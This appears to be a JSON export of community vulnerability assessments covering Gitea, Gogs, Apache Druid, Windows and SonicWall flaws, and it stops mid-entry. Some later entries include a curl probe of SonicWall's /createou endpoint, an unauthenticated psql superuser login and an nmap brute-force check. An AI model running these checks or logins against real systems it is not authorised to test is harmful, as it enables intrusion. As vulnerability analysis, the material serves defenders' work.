it.\r\n\r\nNote that this attack can leave some traces in logs if the log level is set to `debug` or `trace`.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "297bef48-804e-42b4-8e8a-404c987522e0",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "f6423d1d-e817-4481-b5fa-2230446eaffb",
      "created": "2021-04-09T17:00:26.116932Z",
      "revisionDate": "2021-04-28T18:35:37.060192Z",
      "document": "If a Gitea user is allowed to create [Git hooks](https://git-scm.com/docs/githooks), which is the default for administrators, code execution on the server through the web interface is possible. Note that this privilege can also be granted to a non-administrative user.\r\n\r\nGit hooks are scripts that are executed before or after an event such as push, commit, etc. Allowing a user to create such scripts is potentially dangerous and should be avoided as much as possible.\r\n\r\nA new Metasploit exploit [module](https://github.com/rapid7/metasploit-framework/pull/14978) that leverages this insecure setting has been added recently. It enables an attacker to remotely execute arbitrary code if he has access to an account with permission to create Git hooks. For this, it simply creates a new repository, sets a `post-receive` Git hook containing the malicious code and adds a dummy file to the repository to trigger code execution. \r\n\r\nIt has been [mitigated](https://github.com/go-gitea/gitea/pull/13058) in version 1.13.0 by setting the Gitea `DISABLE_GIT_HOOKS` configuration to `true` by default. This completely disables the Git hook creation feature and prevents all users (including admin) from creating custom Git hooks. Administrators will need to think twice before changing it back to `false`, since it is a serious security risk.\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "f4b63f77-4c9c-43ed-ab66-b6d2bd25fd56",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "4c729197-0c0f-4d93-baa6-d11c0defc134",
      "created": "2021-04-09T17:09:26.271149Z",
      "revisionDate": "2021-04-13T20:42:03.752397Z",
      "document": "\r\nThis vulnerability is similar to the Gitea vulnerability identified as [CVE-2020-14144](https://attackerkb.com/topics/ZTlYBaSclN/cve-2020-14144?referrer=akb)  (Gitea is a fork of Gogs). Please refer to this [assessment](https://attackerkb.com/assessments/297bef48-804e-42b4-8e8a-404c987522e0) for details. At the time of writing, no mitigation has been implemented in Gogs. So, it is highly recommended to set the `DISABLE_GIT_HOOKS` configuration setting to `true` to completely disable this feature and prevent all users (including admin) from creating custom Git hooks. It is a serious security risk.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "9116b288-37dc-4708-8f21-4412973b51aa",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "0e681f53-d1e0-4f8c-8799-7801d5905a7d",
      "created": "2021-04-12T13:38:06.537991Z",
      "revisionDate": "2021-04-13T11:58:20.071529Z",
      "document": "Agree with @wvu-r7's assessment. An installation of Apache Druid from the official [release archives](https://archive.apache.org/dist/druid/0.20.0/) was technically vulnerable by default. No auth required, and then the JavaScript execution setting can be enabled in a single request. That same request can hold the payload that gets an attacker RCE as well. The ingestion format is well-documented on Apache Druid's site, so creating an exploit from scratch is relatively trivial. Wanted to add to this, as there is now a Metasploit Module in the [works](https://github.com/rapid7/metasploit-framework/pull/14977).",
      "score": 5,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7a6573b0-3309-4677-84a6-e0e5ae6858fe",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "007c4393-6621-4656-8bfd-d0cfe64dcd65",
      "created": "2021-04-13T20:41:13.242166Z",
      "revisionDate": "2021-04-13T20:41:13.246827Z",
      "document": "Ah, another day, another Win32k privilege escalation used in the wild. [Securelist has a good write-up](https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/) on this bug, which they discovered because it was used in a BITTER APT zero-day attack in (it sounds like) conjunction with [CVE-2021-1732](https://attackerkb.com/assessments/1a332300-7ded-419b-b717-9bf03ca2a14e) (there's a Metasploit module for the second vuln). ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "9e0a9171-254c-450a-80e7-13599abea644",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "9d3fde28-c33f-4537-bc76-c0f46cfdda10",
      "created": "2021-04-14T06:08:03.379209Z",
      "revisionDate": "2021-04-20T15:29:51.973326Z",
      "document": "## Vulnerability Overview\r\n\r\n0patch released a blog article about their micro patch concerning CVE-2021-26897. It describes the root cause as\r\n\r\n> CVE-2021-26897 is a **buffer overflow issue**, whereby a series of **oversized \"dynamic update\" DNS queries with SIG (signature) records** causes writing beyond the buffer boundary **when these records are saved to file**. \r\n\r\nAccording to the blog article the record saves happen\r\n - periodically or\r\n - when the DNS service stops\r\n\r\nThe analysis of 0patch was based on an article from the McAfee Labs. They provided enough information to enable 0patch to gain understanding were the vulnerability is located.\r\n\r\nSuccessful exploitation of this vulnerability results in running code with **Local System** privileges. A attacker does need a domain joined computer and have access to a DNS server. The configuration of the DNS server needs to have **Dynamic Updates** activated.\r\n\r\nIn an **Active Directory environment Dynamic Updates are enabled by default**. The default setting _secure dynamic updates_  only allows domain joined computers to update a DNS zone.\r\n\r\n## Score reasoning\r\n\r\nI rated the _Attack Value_ pretty high. Successful exploitation provides adversaries with high privileged access to domain controllers.  \r\nThe _Exploitability_ score is based on the fact, that the vulnerability can be reversed through public resources and seems to be a buffer overflow. Nevertheless the broader mass of adversaries might be waiting for a detailed writeup or P-o-C and act opportunistic.\r\n\r\n\r\nSources:   \r\n - https://blog.0patch.com/2021/03/analyzing-and-micropatching-with.html\r\n - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/seven-windows-wonders-critical-vulnerabilities-in-dns-dynamic-updates/",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "80d21c02-bd81-49e0-a77b-89a5a0ee5159",
      "editorId": "6f3b5908-d9f3-4773-af6c-4a043c5fe7dd",
      "topicId": "5be82c1e-061f-4c04-93a2-1c15bbde9337",
      "created": "2021-04-21T14:01:40.892088Z",
      "revisionDate": "2021-04-22T20:00:27.204144Z",
      "document": "Pulse Secure Pulse Connect Secure 9.1.R.11.3 and earlier are affected by an authenticated bypass vulnerability, CVE-2021-22893, when exploited it is very likely the threat actor can achieve remote code execution. Exploitation has been observed by APT 5 (UNC2630) and UNC2717.\r\n\r\nA Proof-of-Concept exploit is not publicly available.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "7a80ecf7-459d-4c34-aed0-2b2aeda6d00c",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "9b59ad71-cb71-4c61-a639-5dc0e582ddc2",
      "created": "2021-04-23T20:18:58.30075Z",
      "revisionDate": "2021-04-28T18:34:22.714649Z",
      "document": "Not going to repeat anything that other users have contributed here but one thing I think that was missed from the original advisory that I didn't see noted here is that ICMPv6 is not routeable over the internet, and instead only over the local subnet (see the line `This vulnerability is not routable over the internet, but only over a local subnet.` under the `Mitigations` section of https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16898).\r\n\r\nThis means that at best you could only exploit this if you were on the same network as the attacker. Even then this is a NULL pointer dereference vulnerability and all of the affected versions of Windows 10, as well as the affected server versions don't allow you to map the NULL page needed to turn this into a remotely exploitable vulnerability unless you already have local access to the system (and if you already have local access, then why are you using this vulnerability anyway? There are better alternatives :) ).\r\n\r\nA great indepth writeup of this vulnerability can be found at https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/ which covers the exploit in detail along with how it was patched.\r\n\r\nIf you want to test if systems are affected there is now working BSoD code at https://github.com/0vercl0k/CVE-2021-24086 if you need to check if a system is vulnerable and don't mind BSoD'ing the target.",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "fb2f9a4b-3700-4695-8a93-2f4decb356a7",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "4bb453dc-4a7e-4faf-832b-c5079208a3da",
      "created": "2021-04-23T20:24:00.401442Z",
      "revisionDate": "2021-04-30T21:55:40.25892Z",
      "document": "Not much to add to @bwatters-r7's findings but just wanted to note that there is a detailed analysis of this vulnerability now at https://www.armis.com/resources/iot-security-blog/from-urgent-11-to-frag-44-microsoft-patches-critical-vulnerabilities-in-windows-tcp-ip-stack/ and there is also a PoC out that snuck into another blog at the end of https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/ under the `Bonus: CVE-2021-24074` section.",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": []
    },
    {
      "id": "65b414d9-cb39-40b7-8ab3-d9a9602ff818",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "29a92d92-7f52-42af-809d-8666d33e0df2",
      "created": "2021-04-28T20:19:05.698569Z",
      "revisionDate": "2021-10-17T16:02:53.37983Z",
      "document": "Rating this vulnerability as high since it bypasses all of the checks that MacOS performs on downloaded files. It was reportedly introduced in MacOS version `10.15`, and the fix is in version `11.3`. This vulnerability has also been reported as being exploited in the wild.\r\n\r\nAn unsigned, unnotarized binary downloaded from the Internet is typically blocked from execution; however a script-based app with no `Info.plist` file bypasses those checks. To read about how that exactly happens, see the objective-see blog post [here](https://objective-see.com/blog/blog_0x64.html). This does require user interaction for success, but all it takes is a download and a double click. Additionally, an exploit is quite trivial to make, as all it really needs is a valid app without the `Info.plist` file bundled with it. As always, install your updates.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "43dd6dbb-2aee-41c0-871a-fa325358081c",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "d0a6dbaf-bb93-4a5e-902a-f0c3be2fb4e1",
      "created": "2021-04-28T23:04:28.956751Z",
      "revisionDate": "2021-05-05T20:52:52.763965Z",
      "document": "[CVE-2021-20021](https://nvd.nist.gov/vuln/detail/CVE-2021-20021) is being [exploited in the wild](https://www.fireeye.com/blog/threat-research/2021/04/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise.html) to gain admin access to SonicWall Email Security appliances. RCE typically follows.\r\n\r\nThe vulnerable endpoint `/createou` is implemented as follows:\r\n\r\n```xml\r\n  <servlet-mapping>\r\n   <servlet-name>createou</servlet-name>\r\n   <url-pattern>/createou</url-pattern>\r\n  </servlet-mapping>\r\n```\r\n\r\n```xml\r\n  <servlet>\r\n   <servlet-name>createou</servlet-name>\r\n   <servlet-class>com.mailfrontier.msgcenter.app.api.hosted.ActivateAccount</servlet-class>\r\n   <init-param>\r\n     <param-name>Method</param-name>\r\n     <param-value>ActivateHES</param-value>\r\n    </init-param>\r\n   <load-on-startup>1</load-on-startup>\r\n  </servlet>\r\n```\r\n\r\n```java\r\n  public void doBoth(HttpServletRequest request, HttpServletResponse response) throws IOException {\r\n    Log.info(\"Request received to create OU.\");\r\n    String inputXML = request.getParameter(\"data\");\r\n    String methodName = getInitParameter(\"Method\");\r\n\r\n    if (null == inputXML) {\r\n      inputXML = readRequest(request);\r\n    }\r\n\r\n    if (StringUtil.isEmpty(inputXML)) {\r\n      String str = HostedConfigurationManager.generateResponseXML(\"FAILURE\", methodName, \"100\", \"Input XML is empty.\");\r\n      sendResonse(str, response);\r\n\r\n      return;\r\n    }\r\n    HostedConfigurationManager hostedMgr = new HostedConfigurationManager();\r\n\r\n    String outputXML = null;\r\n    if (\"ActivateHES\".equals(methodName)) {\r\n      outputXML = hostedMgr.createAccount(inputXML, request.getLocale());\r\n    }\r\n    else if (\"DeleteHES\".equals(methodName)) {\r\n      outputXML = hostedMgr.deleteOUAccount(inputXML);\r\n    }\r\n    else if (\"ResetPasswordHES\".equals(methodName)) {\r\n      outputXML = hostedMgr.resetOUPassword(inputXML);\r\n    }\r\n    else if (\"ActivateServiceHES\".equals(methodName)) {\r\n      outputXML = hostedMgr.activateService(inputXML);\r\n    } else {\r\n      return;\r\n    }\r\n\r\n\r\n    sendResonse(outputXML, response);\r\n  }\r\n```\r\n\r\nAnd here's how you can check for the vuln:\r\n\r\n```\r\nwvu@kharak:~$ curl -v http://192.168.123.250/createou -d data=\r\n*   Trying 192.168.123.250...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.250 (192.168.123.250) port 80 (#0)\r\n> POST /createou HTTP/1.1\r\n> Host: 192.168.123.250\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Length: 5\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* upload completely sent off: 5 out of 5 bytes\r\n< HTTP/1.1 200\r\n< pragma: public\r\n< Cache-Control: public\r\n< Content-Type: text/xml\r\n< Content-Length: 280\r\n< Date: Wed, 28 Apr 2021 07:46:54 GMT\r\n<\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<RESPONSE>\r\n<COMPONENT>HOSTEDES</COMPONENT>\r\n<METHOD>ActivateHES</METHOD>\r\n<OUTPUT_XML>\r\n<RESPONSESTATUS>FAILURE</RESPONSESTATUS>\r\n<ERRORNUMBER>100</ERRORNUMBER>\r\n<ERRORDESCRIPTION>Input XML is empty.</ERRORDESCRIPTION>\r\n</OUTPUT_XML>\r\n</RESPONSE>\r\n* Connection #0 to host 192.168.123.250 left intact\r\n* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\nThe following XML strings are particularly significant:\r\n\r\n* `<COMPONENT>HOSTEDES</COMPONENT>`\r\n* `<METHOD>ActivateHES</METHOD>`\r\n* `<ERRORDESCRIPTION>Input XML is empty.</ERRORDESCRIPTION>`",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7ccf6fd2-184e-4327-aa67-bcddb3ee72b6",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "56049e49-30f1-4b08-8b6a-ea82a3ebf8f8",
      "created": "2021-04-29T21:39:30.034619Z",
      "revisionDate": "2021-05-04T13:53:53.663206Z",
      "document": "# CVE-2021-20020?\r\n\r\nSeems to be Postgres running in [trust mode](https://www.postgresql.org/docs/9.2/auth-methods.html#AUTH-TRUST) on TCP port 5029, which essentially equates to unauthenticated access as the Postgres superuser. This can, of course, be leveraged to [achieve RCE](https://www.leidecker.info/downloads/Having_Fun_With_PostgreSQL.txt). Privilege escalation presumably follows.\r\n\r\n## Patch\r\n\r\n```diff\r\ndiff --git a/com/sonicwall/appliance/util/DatabaseUpdate.java b/com/sonicwall/appliance/util/DatabaseUpdate.java\r\nindex 191c850..1578952 100644\r\n--- a/com/sonicwall/appliance/util/DatabaseUpdate.java\r\n+++ b/com/sonicwall/appliance/util/DatabaseUpdate.java\r\n@@ -378,6 +378,7 @@ public class DatabaseUpdate\r\n\r\n     }\r\n     else if (ibdbengine.equalsIgnoreCase(\"postgres\") && !ApplianceUtil.isFlowAgentEnabled(applianceRole) && !ApplianceUtil.isFlowForwarder(applianceRole)) {\r\n+      checkPostgresAccessMode(dbug);\r\n       ApplianceUtil.setPostgresMemory(ramMB);\r\n       SharedUtils.writeFile(dbug, \" -> Set IB(postgres) memory completed.\\n\", doAppend);\r\n     }\r\n@@ -1342,6 +1343,97 @@ public class DatabaseUpdate\r\n     SharedUtils.writeFile(dbug, \" -> Database update completed @ \" + new Date() + \".\\n\", doAppend);\r\n   }\r\n\r\n+  private void checkPostgresAccessMode(File dbug) {\r\n+    try {\r\n+      String pgDataPath = SharedUtils.getPGDataDirectory(installDir);\r\n+      SharedUtils.writeFile(dbug, \" -> Report database PG directory : \" + pgDataPath + \".\\n\", true);\r\n+      File hbConfFile = new File(pgDataPath + File.separator + \"pg_hba.conf\");\r\n+      if (hbConfFile.exists()) {\r\n+        boolean isOnTrustMode = false;\r\n+        try (BufferedReader br = new BufferedReader(new FileReader(hbConfFile))) {\r\n+          String line = null;\r\n+          while ((line = br.readLine()) != null) {\r\n+            if (line.trim().startsWith(\"host\") && line.contains(\"trust\")) {\r\n+              isOnTrustMode = true;\r\n+              break;\r\n+            }\r\n+          }\r\n+        }\r\n+        if (isOnTrustMode) {\r\n+          SharedUtils.writeFile(dbug, \" -> Postgres is on trust mode. It needs to be changed..\\n\", true);\r\n+\r\n+          boolean startService = ApplianceUtil.modifyServices(new String[] { ApplianceUtil.REPORT_DATABASE_SERVICE }, ApplianceUtil.START_SERVICE);\r\n+          if (startService) {\r\n+            SharedUtils.writeFile(dbug, \" -> Report database service has been STARTED : \" + startService + \".\\n\", true);\r\n+            Class.forName(\"org.postgresql.Driver\").newInstance();\r\n+            String url = \"jdbc:postgresql://127.0.0.1:5029/postgres\";\r\n+            try(Connection conn = DriverManager.getConnection(url, \"postgres\", \"\");\r\n+                Statement stmt = conn.createStatement()) {\r\n+\r\n+\r\n+              try {\r\n+                String S_STRING = \"2D2624C80F73C1B77C4A091581F3AD25\";\r\n+                stmt.executeUpdate(\"ALTER USER postgres WITH PASSWORD '\" + TEAV.decryptText(S_STRING) + \"'\");\r\n+                SharedUtils.writeFile(dbug, \" -> Report database super user password set succesfully.\\n\", true);\r\n+              } catch (Exception e) {\r\n+                LogUtil.logError(e, \"Error while setting super user password : \" + e.getMessage(), \"checkPostgresAccessMode\", \"DatabaseUpdate\");\r\n+                SharedUtils.writeFile(dbug, \" -> Error while setting super user password. Error : \" + e.getMessage() + \".\\n\", true);\r\n+              }\r\n+\r\n+            } catch (SQLException sqe) {\r\n+\r\n+              SharedUtils.writeFile(dbug, \" -> EMPTY password failed, which means the root password was already set. Error : \" + sqe.getMessage() + \".\\n\", true);\r\n+            }\r\n+          }\r\n+\r\n+          boolean stopService = ApplianceUtil.modifyServices(new String[] { ApplianceUtil.REPORT_DATABASE_SERVICE }, ApplianceUtil.STOP_SERVICE);\r\n+          SharedUtils.writeFile(dbug, \" -> Report database service has been STOPPED : \" + stopService + \".\\n\", true);\r\n+\r\n+          File hbConfTrustFile = new File(pgDataPath + File.separator + \"pg_hba_do_not_use_\" + (System.currentTimeMillis() / 1000L) + \".conf\");\r\n+          boolean rename = hbConfFile.renameTo(hbConfTrustFile);\r\n+          if (!rename) {\r\n+            rename = (hbConfTrustFile.delete() && hbConfFile.renameTo(hbConfTrustFile));\r\n+          }\r\n+          SharedUtils.writeFile(dbug, \" -> Rename existing hba conf file : \" + rename + \".\\n\", true);\r\n+          if (rename) {\r\n+            try(BufferedReader br = new BufferedReader(new FileReader(hbConfTrustFile));\r\n+                BufferedWriter bw = new BufferedWriter(new FileWriter(hbConfFile))) {\r\n+              String line = null;\r\n+              while ((line = bufferedReader.readLine()) != null) {\r\n+                if (line.trim().startsWith(\"host\") || line.trim().startsWith(\"#host\") || line.trim().startsWith(\"local\") || line.trim().startsWith(\"#local\")) {\r\n+                  bw.write(line.replaceAll(\"trust\", \"md5\"));\r\n+                } else {\r\n+                  bw.write(line);\r\n+                }\r\n+                bw.newLine();\r\n+              }\r\n+              bw.flush();\r\n+              SharedUtils.writeFile(dbug, \" -> Updated the mode of access to MD5 for all the hosts.\\n\", true);\r\n+            }\r\n+            if (SharedUtils.isLinux()) {\r\n+              ApplianceProcessRunner proc = new ApplianceProcessRunner();\r\n+              proc.exec(\"chown -R postgres:postgres \" + pgDataPath + File.separator + \"pg_hba.conf\");\r\n+              SharedUtils.writeFile(dbug, \" -> updated hba conf file permissios.\\n\", true);\r\n+            }\r\n+            SharedUtils.writeFile(dbug, \" -> Delete backup hba conf file : \" + hbConfTrustFile.delete() + \".\\n\", true);\r\n+            startService = ApplianceUtil.modifyServices(new String[] { ApplianceUtil.REPORT_DATABASE_SERVICE }, ApplianceUtil.START_SERVICE);\r\n+            SharedUtils.writeFile(dbug, \" -> Report database service has been STARTED : \" + startService + \".\\n\", true);\r\n+          } else {\r\n+            SharedUtils.writeFile(dbug, \" -> Rename of existing hba conf file failed..!!!!!!.\\n\", true);\r\n+          }\r\n+        } else {\r\n+          SharedUtils.writeFile(dbug, \" -> pg_hba.conf file has all md5. No changes required..\\n\", true);\r\n+        }\r\n+      } else {\r\n+        SharedUtils.writeFile(dbug, \" -> pg_hba.conf file does noit exist in PG Data Directory : \" + pgDataPath + \".\\n\", true);\r\n+      }\r\n+    } catch (Exception e) {\r\n+      SharedUtils.writeFile(dbug, \" -> ERROR while checking trust mode in hba conf file. Error : \" + e.getMessage() + \".\\n\", true);\r\n+      LogUtil.logError(e, e.getMessage(), \"checkPostgresAccessMode\", \"DatabaseUpdate\");\r\n+      LogUtil.printStackTrace(e);\r\n+    }\r\n+  }\r\n+\r\n```\r\n\r\n## PoC\r\n\r\n```\r\nwvu@kharak:~$ psql -U postgres -h 192.168.123.133 -p 5029\r\npsql (13.2, server 9.2.2)\r\nType \"help\" for help.\r\n\r\npostgres=# \\du\r\n                             List of roles\r\n Role name |                   Attributes                   | Member of\r\n-----------+------------------------------------------------+-----------\r\n postgres  | Superuser, Create role, Create DB, Replication | {}\r\n\r\npostgres=# \\l\r\n                                  List of databases\r\n   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges\r\n-----------+----------+----------+-------------+-------------+-----------------------\r\n postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |\r\n template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +\r\n           |          |          |             |             | postgres=CTc/postgres\r\n template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +\r\n           |          |          |             |             | postgres=CTc/postgres\r\n(3 rows)\r\n\r\npostgres=#\r\n```\r\n\r\n## Check\r\n\r\n```\r\nwvu@kharak:~$ nmap -Pn -n -v -p 5029 --script +pgsql-brute --script-args userdb=<(echo postgres),passdb=<(echo CVE-2021-20020) 192.168.123.133\r\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\r\nStarting 